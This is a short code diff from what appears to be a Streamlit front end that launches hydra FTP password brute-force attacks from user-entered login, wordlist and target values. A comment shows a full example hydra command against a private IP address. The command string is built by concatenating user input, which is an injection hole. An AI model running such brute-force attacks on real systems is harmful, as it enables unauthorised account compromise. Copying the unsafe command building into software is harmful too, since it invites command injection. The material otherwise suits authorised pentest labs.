@@ -24,5 +24,9 @@ if st.button("Start attack"):
     else:
         command = "hydra -l " + login + " -P " + dictionary + " " + target + " -t 4 -I -V ftp -f"
         threadManager.start_attack(attack=attack, command=command)
+        st.write(threadManager.check_for_output(attack=attack))
+
 
 # hydra -l user1 -P /usr/share/sqlmap/txt/wordlist.txt 192.168.128.50 -t 4 -I -V ftp -f
+
+# verificar se houve algum erro na execução e apresentar o resultado
